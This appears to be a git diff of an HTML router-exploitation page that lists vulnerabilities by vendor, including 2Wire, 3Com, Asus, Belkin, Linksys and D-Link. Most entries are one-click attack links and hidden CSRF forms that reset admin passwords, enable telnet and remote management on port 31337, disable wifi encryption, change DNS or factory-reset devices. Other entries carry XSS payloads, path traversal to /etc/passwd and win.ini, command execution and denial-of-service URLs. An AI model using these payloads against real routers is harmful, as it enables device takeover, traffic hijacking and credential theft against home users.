hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm')">[IP]</a></div>
+	<div><a href="javascript:setip('/xslt?PAGE=CD35_SETUP_01_POST&password1=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm&password2=hkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkmhkhkmhkmhkmhkmhkmhkmhkmhkm')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>04/13/08</div>
 	<div><a href="http://hakim.ws/2wire/dsldos.html">[+]</a></div>
 	<div><a href="http://home/xslt?page=%^">17x 18x 20x 27x DSL denial of service</a></div>
-	<div><a href="javascript:setip('/xslt?page=%^')">[IP]</a></div>
+	<div><a href="javascript:setip('/xslt?page=%^')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/07/08</div>
 	<div><a href="http://www.hakim.ws/2wire/urlmagico.txt">[+]</a></div>
 	<div><a href="http://home/xslt?page=mgmt_data">17x 18x 20x 27x mgmt_data configuration disclosure</a></div>
-	<div><a href="javascript:setip('/xslt?page=mgmt_data')">[IP]</a></div>
+	<div><a href="javascript:setip('/xslt?page=mgmt_data')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>01/30/08</div>
 	<div><a href="http://www.securityfocus.com/bid/27516/info">[+]</a></div>
 	<div><a href="http://home/xslt?page=H04">17x 18x 20x 27x H04 authentication bypass</a></div>
-	<div><a href="javascript:setip('/xslt?page=H04')">[IP]</a></div>
+	<div><a href="javascript:setip('/xslt?page=H04')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/14/07</div>
 	<div><a href="http://hakim.ws/textos/2wirexsrf.txt">[+]</a></div>
 	<div><a href="javascript:wireAddHosts()">17x 18x 20x 27x 38x Add domain to hosts table CSRF</a></div>
-	<div><a href="javascript:wireAddHostsip()">[IP]</a></div>
+	<div><a href="javascript:wireAddHostsip()">[SET IP]</a></div>
 </article>
 <div style="float: right";><a href="#">^ Top</a></div>
 </section><br><br><section id="com">
@@ -1476,75 +1848,82 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>05/21/10</div>
 	<div><a href="http://www.exploit-db.com/exploits/12680">[+]</a></div>
 	<div><a href="javascript:setip(':8080/imc/reportscript/sqlserver/deploypara.properties')">iMC Intelligent Management Center configuration disclosure</a></div>
-	<div><a href="javascript:setip(':8080/imc/reportscript/sqlserver/deploypara.properties')">[IP]</a></div>
+	<div><a href="javascript:setip(':8080/imc/reportscript/sqlserver/deploypara.properties')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>05/21/10</div>
 	<div><a href="http://www.exploit-db.com/exploits/12679">[+]</a></div>
 	<div><a href="javascript:setip(':8080/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini')">iMC Intelligent Management Center traversal</a></div>
-	<div><a href="javascript:setip(':8080/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini')">[IP]</a></div>
+	<div><a href="javascript:setip(':8080/imc/report/DownloadReportSource?dirType=webapp&fileDir=reports&fileName=reportParaExample.xml..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>10/19/09</div>
 	<div><a href="http://www.exploit-db.com/exploits/9862">[+]</a></div>
 	<div><a href="javascript:comcommandl()">OfficeConnect command execution </a></div>
-	<div><a href="javascript:comcommand()">[IP]</a></div>
+	<div><a href="javascript:comcommand()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>11/14/08</div>
 	<div><a href="http://packetstormsecurity.org/0811-exploits/PR07-40.txt">[+]</a></div>
 	<div><a href="http://169.254.2.1/advanced.htm">AP 8760 authentication bypass</a></div>
-	<div><a href="javascript:setip('/advanced.htm')">[IP]</a></div>
+	<div><a href="javascript:setip('/advanced.htm')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>06/16/08</div>
 	<div><a href="http://www.ikkisoft.com/stuff/LC-2008-05.txt">[+]</a></div>
 	<div><a href="http://192.168.1.1/SaveCfgFile.cgi">OfficeConnect configuration disclosure</a></div>
-	<div><a href="javascript:setip('/SaveCfgFile.cgi')">[IP]</a></div>
+	<div><a href="javascript:setip('/SaveCfgFile.cgi')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>06/01/05</div>
 	<div><a href="http://seclists.org/vulnwatch/2005/q1/42">[+]</a></div>
 	<div><a href="http://192.168.1.1/main/config.bin">OfficeConnect 3CRWE454G72 configuration disclosure</a></div>
-	<div><a href="javascript:setip('/main/config.bin')">[IP]</a></div>
+	<div><a href="javascript:setip('/main/config.bin')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>04/16/05</div>
 	<div><a href="http://lostmon.blogspot.com/2005/04/3com-adsl-11g-cradsl72-router.html">[+]</a></div>
 	<div><a href="http://192.168.1.1/cgi-bin/config.bin">3cradsl72 configuration disclosure</a></div>
-	<div><a href="javascript:setip('/cgi-bin/config.bin')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/config.bin')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>10/13/04</div>
 	<div><a href="http://www.securityfocus.com/bid/11408">[+]</a></div>
 	<div><a href="http://192.168.1.1/app_sta.stm">3cradsl72 information disclosure & authenication bypass</a></div>
-	<div><a href="javascript:setip('/app_sta.stm')">[IP]</a></div>
+	<div><a href="javascript:setip('/app_sta.stm')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>00/00/01</div>
 	<div><a href="http://www.ikkisoft.com/stuff/LC-2008-05.txt">[+]</a></div>
 	<div><a href="http://192.168.1.254/graphics/sml3com%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s">812 denial of service</a></div>
-	<div><a href="javascript:setip('/graphics/sml3com%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s')">[IP]</a></div>
+	<div><a href="javascript:setip('/graphics/sml3com%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>00/00/01</div>
 	<div><a href="http://www.ikkisoft.com/stuff/LC-2008-05.txt">[+]</a></div>
 	<div><a href="http://192.168.1.254/adsl_reset">812 denial of service 2</a></div>
-	<div><a href="javascript:setip('/adsl_reset')">[IP]</a></div>
+	<div><a href="javascript:setip('/adsl_reset')">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="arris">
 <h2>Arris</h2>
 <h3><a href="javascript:img('WTM652')">WTM652</a>, <a href="javascript:img('TM602A')">TM602A</a></h3>
+
+<article>
+	<div>15/10/13</div>
+	<div><a href="http://packetstormsecurity.com/files/123631/ARRIS-DG860A-WPS-PIN-Generator.html">[+]</a></div>
+	<div><a href="javascript:DG860A_wps_gen();">Arris DG860A WPS PIN Generator</a></div>
+	<div></div>
+</article>
 
 <article>
 	<div>00/00/0?</div>
@@ -1567,8 +1946,19 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>17/08/12</div>
 	<div><a href="http://packetstormsecurity.com/files/115663/Alpha-Networks-ADSL2-2-Wireless-Router-ASL-26555-Password-Disclosure.html">[+]</a></div>
 	<div><a href="http://192.168.1.1:8000/APIS/returnJSON.htm">ASL-26555 Remote Administration Password Disclosure</a></div>
-	<div><a href="javascript:setip(':8000/APIS/returnJSON.htm')">[IP]</a></div>
-	<div></div>
+	<div><a href="javascript:setip(':8000/APIS/returnJSON.htm')">[SET IP]</a></div>
+</article>
+
+<div style="float: right"><a href="#">^ Top</a></div>
+</section><br><br><section id="alcatellucent">
+<h2>Alcatel-Lucent</h2>
+<h3><a href="javascript:img('I-240W-Q')">I-240W-Q</a></h3>
+
+<article>
+	<div>12/02/13</div>
+	<div><a href="http://www.hakim.ws/2012/12/puerta-trasera-en-fibra-optica-alcatel-lucent-de-infinitum/">[+]</a></div>
+	<div><a href="javascript:i230w_auth()">I-240W-Q Authentication Bypass</a></div>
+	<div><a href="javascript:i230w_auth(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
 </article>
 
 <div style="float: right"><a href="#">^ Top</a></div>
@@ -1580,22 +1970,58 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>05/15/09</div>
 	<div><a href="http://www.securitum.pl/dh/asmax-ar-804-gu-compromise">[+]</a></div>
 	<div><a href="javascript:asmrce()">AR-804gu command execution</a></div>
-	<div><a href="javascript:asmrce()">[IP]</a></div>
+	<div><a href="javascript:asmrce()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>05/15/09</div>
 	<div><a href="http://www.securitum.pl/dh/asmax-ar-804-gu-compromise">[+]</a></div>
 	<div><a href="javascript:asmfile()">AR-804gu file disclosure</a></div>
-	<div><a href="javascript:asmfile()">[IP]</a></div>
+	<div><a href="javascript:asmfile()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>05/15/09</div>
 	<div><a href="http://www.securitum.pl/dh/asmax-ar-804-gu-compromise">[+]</a></div>
 	<div><a href="http://192.168.1.1/cgi-bin/">AR-804gu directory listing</a></div>
-	<div><a href="javascript:setip('/cgi-bin/')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/')">[SET IP]</a></div>
 </article>
+<div style="float: right"><a href="#">^ Top</a></div>
+</section><br><br><section id="asus">
+<form name="N56U" action="http://192.168.1.1/start_apply.htm" method="post">
+<input type="hidden" name="http_username" value="admin"> <!-- Admin Username -->
+<input type="hidden" name="http_passwd" value="password"> <!--Admin Password  -->
+<input type="hidden" name="http_passwd2" value="password"> <!--Admin Password  -->
+<input type="hidden" name="v_password2" value="password">
+<input type="hidden" name="telnetd_enable" value="1"> <!--Enable Telnet-LAN Only-->
+<input type="hidden" name="misc_http_x" value="1"> <!--Enable HTTP Remote MGMT -->
+<input type="hidden" name="misc_httpport_x" value="31337"><!--HTTP Remote MGMT Port-->
+<input type="hidden" name="action_mode" value="apply">
+</form>
+<h2>Asus</h2>
+<h3><a href="javascript:img('RT-N66U')">RT-N66U</a>, <a href="javascript:img('RT-N56U')">RT-N56U</a>, <a href="javascript:img('RT-AC66U')">RT-AC66U</a></h3>
+
+<article>
+	<div>09/10/13</div>
+	<div><a href="https://www.qxcg.net/arbitrary-command-execution-on-an-asus-rtn66u.html">[+]</a></div>
+	<div><a href="javascript:rtn66uexe()">RT-N66U command execution</a></div>
+	<div><a href="javascript:rtn66uexe()">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>08/13/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/asus_rtn56u.jsp">[+]</a></div>
+	<div><a href="javascript:N56Uexe()">RT-N56U RT-AC66U command execution</a></div>
+	<div><a href="javascript:N56Uuexe()">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>08/13/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/asus_rtn56u.jsp">[+]</a></div>
+	<div><a href="javascript:document.N56U.submit();">RT-N56U RT-AC66U reset admin password enable remote http csrf</a></div>
+	<div><a href="javascript:N56Ur()">[SET IP]</a></div>
+</article>
+
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="belkin">
 <form name='belkindns' action='http://192.168.2.1/cgi-bin/setup_dns.exe' method='post'>
@@ -1616,65 +2042,103 @@ function GenArrisPasswords(startdate, enddate) {
 <input type="hidden" name="pws" value="password">
 </form>
 <h2>Belkin</h2>
-<h3><a href="javascript:img('F9K1002')">F9K1002</a>, <a href="javascript:img('Belkin Wireless G router F5D7234-4')">Belkin Wireless G router F5D7234-4</a>, <a href="javascript:img('F5D7230-4')">F5D7230-4</a>, <a href="javascript:img('MIMO F5D9230??4')">MIMO F5D9230??4</a></h3>
+<h3><a href="javascript:img('F5D8236-4v2')">F5D8236-4v2</a>, <a href="javascript:img('N900')">N900</a>, <a href="javascript:img('N300')">N300</a>, <a href="javascript:img('F9K1002')">F9K1002</a>, <a href="javascript:img('Belkin Wireless G router F5D7234-4')">Belkin Wireless G router F5D7234-4</a>, <a href="javascript:img('F5D7230-4')">F5D7230-4</a>, <a href="javascript:img('MIMO F5D9230??4')">MIMO F5D9230??4</a></h3>
+
+<article>
+	<div>04/15/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="javascript:F5D8236_4v2_csrf_admin();">F5D8236-4v2 enable remote MGMT CSRF</a></div>
+	<div><a href="javascript:F5D8236_4v2_csrf_admin(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>04/15/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="javascript:N300_csrf_admin();">N300 remove admin password & enable remote MGMT CSRF</a></div>
+	<div><a href="javascript:N300_csrf_admin(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>04/15/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="javascript:N900_xss_ssid();">N900 ssid stored cross site scripting</a></div>
+	<div><a href="javascript:N900_xss_ssid(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>04/15/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="javascript:N900_xss_psk();">N900 psk stored cross site scripting</a></div>
+	<div><a href="javascript:N900_xss_psk();" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>04/15/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="javascript:N900_csrf();">N900 Change admin creds & enable remote MGMT CSRF</a></div>
+	<div><a href="javascript:N900_csrf(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>07/13/12</div>
 	<div><a href="http://blog.ncircle.com/t5/VERT-Security-Research-Blog/Belkin-CVE-2012-2765-When-is-a-Password-Not-a-Password/ba-p/4622">[+]</a></div>
 	<div><a href="javascript:document.tF.submit();">F9K1002 Authentication Bypass</a></div>
-	<div><a href="javascript:tF()">[IP]</a></div>
+	<div><a href="javascript:tF()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>07/13/12</div>
 	<div><a href="http://blog.ncircle.com/t5/VERT-Security-Research-Blog/Belkin-CVE-2012-2765-When-is-a-Password-Not-a-Password/ba-p/4622">[+]</a></div>
 	<div><a href="javascript:alert('The hexlified MD5 hash of the administrative password is stored in the password variable within the JavaScript in /login.stm.');setip('/login.stm');">F9K1002 Web Management Password Exposure</a></div>
-	<div><a href="javascript:alert('The hexlified MD5 hash of the administrative password is stored in the password variable within the JavaScript in /login.stm.');setip('/login.stm');">[IP]</a></div>
+	<div><a href="javascript:alert('The hexlified MD5 hash of the administrative password is stored in the password variable within the JavaScript in /login.stm.');setip('/login.stm');">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>05/30/11</div>
 	<div><a href="http://www.exploit-db.com/exploits/17349/">[+]</a></div>
 	<div><a href="http://192.168.2.1/login.stm">F5D7234-4 v5 admin password md5</a></div>
-	<div><a href="javascript:setip('/login.stm')">[IP]</a></div>
+	<div><a href="javascript:setip('/login.stm')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/25/08</div>
 	<div><a href="http://www.sourcesec.com/Lab/soho_router_report.pdf">[+]</a></div>
 	<div><a href="http://192.168.2.1/system.stm">F5D8233-4 v3 configuration disclosure</a></div>
-	<div><a href="javascript:setip('/system.stm')">[IP]</a></div>
+	<div><a href="javascript:setip('/system.stm')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/25/08</div>
 	<div><a href="http://www.sourcesec.com/Lab/soho_router_report.pdf">[+]</a></div>
 	<div><a href="http://192.168.2.1/cgi-bin/restart.exe">F5D8233-4 v3 router reboot</a></div>
-	<div><a href="javascript:setip('/cgi-bin/restart.exe')">[IP]</a></div>
+	<div><a href="javascript:setip('/cgi-bin/restart.exe')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>08/25/08</div>
 	<div><a href="http://exploit-db.com/exploits/6305">[+]</a></div>
 	<div><a href="javascript:document.belkinrest.submit();">F5D7230-4 factory reset</a></div>
-	<div><a href="javascript:belkinrest()">[IP]</a></div>
+	<div><a href="javascript:belkinrest()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/03/08</div>
 	<div><a href="http://www.gnucitizen.org/blog/router-hacking-challenge/">[+]</a></div>
 	<div><a href="javascript:belkindns()">F5D7230-4 change dns servers</a></div>
-	<div><a href="javascript:belkindnsr()">[IP]</a></div>
+	<div><a href="javascript:belkindnsr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>01/20/08</div>
 	<div><a href="http://exploit-db.com/exploits/4941">[+]</a></div>
 	<div><a href="http://192.168.2.1/SaveCfgFile.cgi">MIMO F5D9230??4 configuration disclosure</a></div>
-	<div><a href="javascript:setip('/SaveCfgFile.cgi')">[IP]</a></div>
+	<div><a href="javascript:setip('/SaveCfgFile.cgi')">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="cisco">
+<form name='ea2700pass' action='http://192.168.1.1/apply.cgi' method='post'><input type=hidden name='submit_button' value="Management"><input type=hidden name='action' value="Apply"><input type=hidden name='change_action' value=""><input type=hidden name='PasswdModify' value="1"><input type=hidden name='http_passwd' value="password"><input type=hidden name='http_passwdConfirm' value="password"></form>
+<form name='ea2700xss' action='http://192.168.1.1/apply.cgi' method='post'><input type=hidden name='submit_button' value="xss';alert(1)//934"><input type=hidden name='action' value="Apply"></form>
+<form name='ea2700path' action='http://192.168.1.1/apply.cgi' method='post'><input type=hidden name='submit_button' value="Wireless_Basic"><input type=hidden name='change_action' value="gozila_cgi"><input type=hidden name='next_page' value="/etc/passwd"></form>
 <form name='wrtwifi' action='http://192.168.1.1/Security.tri' method='post'><input type=hidden name='SecurityMode' value="0"><input type=hidden name='layout' value="en"></form>
 <form name='wrtdefault' action='http://192.168.1.1/factdefa.tri' method='post'><input type=hidden name='FactoryDefaults' value="Yes"><input type=hidden name='layout' value="en"></form>
 <form name='wrtadmin' action='http://192.168.1.1/manage.tri' method='post'>
@@ -1746,70 +2210,108 @@ function GenArrisPasswords(startdate, enddate) {
 <input type="hidden" name="message" value="">
 <input type="hidden" name="h_wps_cur_status" value="">
 </form>
-<h2>Cisco</h2>
-<h3><a href="javascript:img('Linksys WRT54G')">Linksys WRT54G</a>, <a href="javascript:img('WAG120N')">WAG120N</a></h3>
+<form name="CSRFxssPWN" enctype="text/plain" action="http://10.0.1.1/apply.cgi" method="post"/>
+<input type="hidden" name="submit_button" value="%27%3balert(%22i CaN hAZ XSS by G42%22)%3b//&"/>
+</form>
+<h2>Cisco Linksys</h2>
+<h3><a href="javascript:img('Linksys EA2700')">Linksys EA2700</a>, <a href="javascript:img('Linksys WRT54G')">Linksys WRT54G</a>, <a href="javascript:img('WAG120N')">WAG120N</a></h3>
+
+<article>
+	<div>04/15/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="javascript:javascript:document.CSRFxssPWN.submit()">WRT310Nv2 Cross site scripting</a></div>
+	<div><a href="javascript:CSRFxssPWN()">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>04/15/13</div>
+	<div><a href="https://superevr.com/blog/wp-content/uploads/2013/04/linksys_vulns.txt">[+]</a></div>
+	<div><a href="http://192.168.1.1/Management.asp/">Router Source Code Disclosure</a></div>
+	<div><a href="javascript:setip('/Management.asp/')">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>04/15/13</div>
+	<div><a href="https://superevr.com/blog/wp-content/uploads/2013/04/linksys_vulns.txt">[+]</a></div>
+	<div><a href="javascript:javascript:document.ea2700pass.submit()">EA2700 WRT310Nv2 Password Change Insufficient Authentication CSRF</a></div>
+	<div><a href="javascript:ea2700passr()">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>04/15/13</div>
+	<div><a href="https://superevr.com/blog/wp-content/uploads/2013/04/linksys_vulns.txt">[+]</a></div>
+	<div><a href="javascript:javascript:document.ea2700path.submit()">EA2700 File Path Traversal apply.cgi</a></div>
+	<div><a href="javascript:ea2700pathr()">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>04/15/13</div>
+	<div><a href="https://superevr.com/blog/wp-content/uploads/2013/04/linksys_vulns.txt">[+]</a></div>
+	<div><a href="javascript:javascript:document.ea2700xss.submit()">EA2700 XSS Vulnerability apply.cgi</a></div>
+	<div><a href="javascript:ea2700xssr()">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>02/26/11</div>
 	<div><a href="http://www.exploit-db.com/exploits/16252/">[+]</a></div>
 	<div><a href="javascript:wag120pass()">WAG120N Change admin password</a></div>
-	<div><a href="javascript:wag120passr()">[IP]</a></div>
+	<div><a href="javascript:wag120passr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/26/11</div>
 	<div><a href="http://www.exploit-db.com/exploits/16252/">[+]</a></div>
 	<div><a href="javascript:wag120add()">WAG120N Add admin user</a></div>
-	<div><a href="javascript:wag120addr()">[IP]</a></div>
+	<div><a href="javascript:wag120addr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>05/26/10</div>
 	<div><a href="http://seclists.org/bugtraq/2010/Jun/93">[+]</a></div>
 	<div><a href="http://192.168.1.245/debug.cgi">WAP54Gv3 debug interface (Gemtek:gemtekswd)</a></div>
-	<div><a href="javascript:setip('/debug.cgi')">[IP]</a></div>
+	<div><a href="javascript:setip('/debug.cgi')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/26/08</div>
 	<div><a href="http://www.gnucitizen.org/blog/holes-in-embedded-devices-authentication-bypass-pt-4/">[+]</a></div>
 	<div><a href="javascript:wrtradmin()">WRT54G enable remote interface</a></div>
-	<div><a href="javascript:wrtradminr()">[IP]</a></div>
+	<div><a href="javascript:wrtradminr()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/26/08</div>
 	<div><a href="http://www.gnucitizen.org/blog/router-hacking-challenge/">[+]</a></div>
 	<div><a href="http://192.168.1.1/Config.bin">WRT54G config disclosure</a></div>
-	<div><a href="javascript:setip('/Config.bin')">[IP]</a></div>
+	<div><a href="javascript:setip('/Config.bin')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/26/08</div>
 	<div><a href="http://www.gnucitizen.org/blog/router-hacking-challenge/">[+]</a></div>
 	<div><a href="javascript:document.wrtdefault.submit()">WRT54G restore factory defaults</a></div>
-	<div><a href="javascript:wrtdefault()">[IP]</a></div>
+	<div><a href="javascript:wrtdefault()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>01/21/08</div>
 	<div><a href="http://swbae.egloos.com/1701135">[+]</a></div>
 	<div><a href="http://192.168.1.1/lastpassword.htm">WRT54G last password in plain text</a></div>
-	<div><a href="javascript:setip('/lastpassword.htm')">[IP]</a></div>
+	<div><a href="javascript:setip('/lastpassword.htm')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>06/05/06</div>
 	<div><a href="http://www.securityfocus.com/archive/1/442452/30/0/threaded">[+]</a></div>
 	<div><a href="javascript:document.wrtwifi.submit()">WRT54G disable wifi encription</a></div>
-	<div><a href="javascript:wrtwifi()">[IP]</a></div>
+	<div><a href="javascript:wrtwifi()">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>06/05/06</div>
 	<div><a href="http://www.securityfocus.com/archive/1/442452/30/0/threaded">[+]</a></div>
 	<div><a href="javascript:wrtadmin()">WRT54G change admin password</a></div>
-	<div><a href="javascript:wrtadminr()">[IP]</a></div>
+	<div><a href="javascript:wrtadminr()">[SET IP]</a></div>
 </article>
 <div style="float: right"><a href="#">^ Top</a></div>
 </section><br><br><section id="DDWRT">
@@ -1820,14 +2322,14 @@ function GenArrisPasswords(startdate, enddate) {
 	<div>12/27/10</div>
 	<div><a href="http://www.devttys0.com/2010/12/dd-wrt-i-know-where-you-live/">[+]</a></div>
 	<div><a href="http://192.168.1.1/Info.live.htm">DD-WRT information disclosure</a></div>
-	<div><a href="javascript:setip('/Info.live.htm')">[IP]</a></div>
+	<div><a href="javascript:setip('/Info.live.htm')">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>07/20/09</div>
 	<div><a href="http://www.securityfocus.com/bid/35742/info">[+]</a></div>
 	<div><a href="javascript:ddwrtexec()">DD-WRT remote comand execution</a></div>
-	<div><a href="javascript:ddwrtexecr()">[IP]</a></div>
+	<div><a href="javascript:ddwrtexecr()">[SET IP]</a></div>
 </article>
 
 <div style="float: right"><a href="#">^ Top</a></div>
@@ -1842,100 +2344,115 @@ function GenArrisPasswords(startdate, enddate) {
 <input type="hidden" name="security:settings/idle_timeout" value="30">
 </form>
 <form method="POST" name="dsl2640" action="#"></form>
+<form method="POST" name="f2640U" action="http://192.168.1.1/wizisp.cgi?quick=1&sntpRefresh=0&wizTmpSntpEnable=0&wizTmpDST=0">
 <br><br>
 <section id="DLink">
 <h2>D-Link</h2>
 <h3><a href="javascript:img('D-Link DWL 2100AP')">D-Link DAP 1150</a>, <a href="javascript:img('D-Link DWL 2100AP')">DWL 2100AP</a>, <a href="javascript:img('704P')">704P</a>, <a href="javascript:img('DIR-615')">DIR-615</a>, <a href="javascript:img('DSL-500T')">DSL-500T</a>, <a href="javascript:img('DSL-502T')">DSL-502T</a>, <a href="javascript:img('DSL-504T')">DSL-504T</a>, <a href="javascript:img('DSL-562T')">DSL-562T</a>, <a href="javascript:img('DSL-G604T')">DSL-G604T</a>, <a href="javascript:img('DWL-7000AP')">DWL-7000AP</a>, <a href="javascript:img('DWL-7100AP')">DWL-7100AP</a>, <a href="javascript:img('DNS-320')">DNS-320</a>, <a href="javascript:img('DNS-325')">DNS-325</a></h3>
 
 <article>
+	<div>05/08/12</div>
+	<div><a href="http://1337day.com/exploit/18213">[+]</a></div>
+	<div><a href="javascript:document.f2640U.submit()">D-Link DSL-2640U PPoE Data Disclosure (ADSL Router)</a></div>
+	<div><a href="javascript:ff2640U();">[SET IP]</a></div>
+</article>
+
+<article>
+	<div>07/26/13</div>
+	<div><a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">[+]</a></div>
+	<div><a href="javascript:DIR865L();">DIR 865L PHP file inclusion</a></div>
+	<div><a href="javascript:DSL2640B(ip);" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
+
+<article>
 	<div>02/19/12</div>
 	<div><a href="http://www.exploit-db.com/exploits/18499/">[+]</a></div>
 	<div><a href="javascript:DSL2640B();">DSL-2640B change admin password CSRF</a></div>
-	<div><a href="javascript:DSL2640Br();">[IP]</a></div>
+	<div><a href="javascript:DSL2640Br();">[SET IP]</a></div>
 </article>
 
 <article>
 	<div>02/08/12</div>
 	<div><a href="http://www.securityfocus.com/bid/50902/info">[+]</a></div>
 	<div><a href="javascript:dns320();">DNS-320 DNS-325 command execution</a></div>
